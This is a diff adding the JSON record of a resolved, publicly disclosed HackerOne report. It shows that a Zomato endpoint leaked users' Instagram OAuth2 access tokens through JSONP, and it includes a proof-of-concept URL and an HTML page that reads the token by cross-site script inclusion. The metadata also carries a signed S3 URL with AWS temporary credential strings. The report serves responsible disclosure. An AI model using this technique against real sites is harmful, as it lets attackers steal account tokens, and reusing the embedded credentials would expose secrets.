@@ -1,0 +1,120 @@
+{
+  "id": 138270,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMzgyNzA=",
+  "url": "https://hackerone.com/reports/138270",
+  "title": "Instagram OAuth2 Implementation Leaks Access Token; Allows for Cross-Site Script Inclusion (XSSI)",
+  "state": "Closed",
+  "substate": "resolved",
+  "readable_substate": "Resolved",
+  "created_at": "2016-05-12T12:11:56.128Z",
+  "submitted_at": "2016-05-12T12:11:56.128Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "dejavuln",
+    "url": "/dejavuln",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/045/064/2158310e1f704a15f20abf07331e73795f2e8153_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 2943,
+    "url": "https://hackerone.com/zomato",
+    "handle": "zomato",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/002/943/71b47f9aa21166f0989dfb97112ca10c66a9d0b2_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/002/943/71b47f9aa21166f0989dfb97112ca10c66a9d0b2_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Zomato",
+      "twitter_handle": "Zomato",
+      "website": "https://www.zomato.com",
+      "about": "The fastest way to search for great places to eat at and order from around you. Serving 24 countries worldwide."
+    }
+  },
+  "has_bounty?": false,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2016-06-22T11:33:44.588Z",
+  "bug_reporter_agreed_on_going_public_at": "2016-06-22T11:04:11.754Z",
+  "team_member_agreed_on_going_public_at": "2016-06-22T11:33:44.482Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Once a user connects his Zomato account to Instagram (via OAuth2), the page `https://www.zomato.com/php/instagram_tag_relay` leaks the Instagram OAuth2 Access Token issued to Zomato:\n\nPoC:\n`https://www.zomato.com/php/instagram_tag_relay?callback=aaabc`\n\nResult (personal data x'ed):\n```\nHTTP/1.1 200 OK\n[...]\nContent-Type: text/html; charset=UTF-8\n[...]\naaabc({\"data\":[],\"relay_summary\":{\"fresh_img_request_ongoing\":false,\"new_imgs_fetched\":true},\"pagination\":[],\"tag\":\"zomato\",\"user\":{\"user_id\":\"3184xxxx\",\"access_token\":\"3184371440.87c9ab8.xxxxxxxxxxxxxxxxxxxx\",\"username\":\"xxxxxxx\",\"profile_picture\":\"https:\\/\\/igcdn-photos-e-a.akamaihd.net\\/hphotos-ak-xft1\\/t51.2885-19\\/11906329_960xxxxxxxxxxxxx.jpg\",\"email\":\"xxxxxx@example.org\"},\"request\":{\"callback\":\"aaabc\"}})\n```\n\nThis is the result of a _**design issue**_: Zomato is using the OAuth2 Server-Side Flow where an Authorization Code is exchanged for an Access Token. The exchange happens server-side; there should be no need to later expose the Access Token to the end-user as it significantly increases the risk of Access Token leakage.\n\nDue to a _**separate vulnerability**_, gaining access to this Access Token becomes indeed quite easy. An attacker might craft an HTML page, embed the vulnerable page as a script and receive the page content at the function referenced via the `callback` parameter. \n\nPoC:\n```\n<html>\n<script>\nfunction aaabc(s)\n{\nalert(JSON.stringify(s));\n}\n</script>\n\n<script src=\"https://www.zomato.com/php/instagram_tag_relay?callback=aaabc\"></script>\n\n</html>\n```\n\nResult: \nF93245 \n\nPlease note these are actually two separate issues: \n1. The OAuth2 Access Token should not be exposed to the end-user in the first place. \n2. XSSI / Cross-Site Script Inclusion: sensitive data should not be made accessible in a way that allows it to be processed by a potentially malicious web page.\n",
+  "weakness": {
+    "id": 18,
+    "name": "Information Disclosure"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 93245,
+      "file_name": "instagram-oauth2-atleak.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/093/245/452409d977e2c348565e9fee8e25e00d78f3ca55/instagram-oauth2-atleak.png?response-content-disposition=attachment%3B%20filename%3D%22instagram-oauth2-atleak.png%22%3B%20filename%2A%3DUTF-8%27%27instagram-oauth2-atleak.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYS6T2T4S%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T121047Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQC%2FRlgMvrp4sI%2BNN%2Bw0e%2BHS%2Fi0X4FFUjwI6hTqAUnQWYQIgPZYpGqRtUrQEdEqyjQ7VWI1A7cqBCtguMbt4YIuIcNIqsQUIcBADGgwwMTM2MTkyNzQ4NDkiDIwmV%2FtI2Z%2BVlVJQOCqOBc7CvK4xINdfRva6PibURBsgRmkDXf%2FsfRb09TcUdBlBFNmKVkxQPEdRC1Mnq1DDtMy%2FcGXOrpRoAxZrwVEpSHxUpZo%2FJRAHbOWAQBUrr1l1gC6t9Ol8wWC7PLi7X%2FD2%2BIDYKaPOL3QSa9PdanrueH6WdeJdiGnGVaFnEkwm%2BHPy%2BNshabbrQKXqkiQ%2FKRYoPLt1dvZ1N24FQHGKbhJBHzJTQzkx7Zrace5bXg%2BJgLt6PscN7h%2BULLdZS9N80mauppM1Bvb6ZAc1mkJWSe0udi0WKGIY51k32kzf%2FZRlsjDjv3wLANMhuaYZxtbiG3WqGDC8fit9fFP3v6IHyuIqz8W%2FJG6NK1zlTj4Bv2ofITBdDLGFFR8yKVIFqByGSOWGgKHI%2Bp%2FU758TaX5fX5ORVjWG5txmLAIp2Ye6HKb1jos9tPe0WwKFf1VXSzM%2BIPDtrwzelzeq1ecGD7Qov%2BE7m6FSNQhrPCH5MWK76q29U5jHq4v9GWkh6dO8IcaXMgC5%2BVrL8P1250J44UPDKtphXTjBb3iA00qdsdp1F%2B%2Fa15Q2N6WK4Zj8yXgSiYj5SqlvrlLooUiEv4FjCaTKJ%2B%2F6X9LlHBvM59P7vynVxy%2FZvv1tVFuE%2B1IJtkjeAr5%2BJZnYlQqnuceFw3MjImSw8YPBpzvy4Syrbl%2FiRlfszmlv0xFykH9Tf1k32eSbbbhd5%2B5c1f0w5Do%2F0wB%2B%2F7HU5grw%2Fsc%2Fa4ONp4AL9dothtFzDI9yrU86H0Tj%2BgA4bfs%2Bq8KiM04Zifmo5%2BSqSn50Vbg%2BbyS%2BCKKHCDlA%2FBvQCMxY1dpo4pqPW8%2FQk9SE5zpcrHezMMGRkJg26Wm6o5Sur%2BuuyvPlmvWPTnE137%2FSashTujC8pqyuBjqxAQugPapY7MCgoHnN3A9t0%2FPfp1FpK4tJONEidbWkGhXB6NA90wXv8DKSeZxQJFUZ19mDVzE0iG0%2BiihjuEoeGetVY82tVdAOUT4mlhJqZaL%2FmnCgfpwcatSd2OhHah3YU4JQGvlArly1nhC20oudJ%2FsRukkppx66K%2BMQZDqC%2BF8kHc8TtamF0NWCg6ZU6SXNGyIAZPkCoGCxc2Yn3P3JIGfWLiNvqDATfN7jYp4Rp1toDQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=02bf4ea6849e510a5d6376088667b6dbd9c772d87fa4885f02dc2a0c0eb212d8",
+      "file_size": 31880,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2016-07-22T11:04:11.861Z",
+  "allow_singular_disclosure_after": -238640795.32483998,
+  "singular_disclosure_allowed": true,
+  "vote_count": 14,
+  "voters": [
+    "bogdantcaciuc",
+    "ibring",
+    "sasi2103",
+    "trib0rg",
+    "mahmoud_osama",
+    "zeroknife",
+    "dyabla",
+    "abdulxhannan",
+    "bg__1060",
+    "pei",
+    "and 4 more..."
+  ],
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
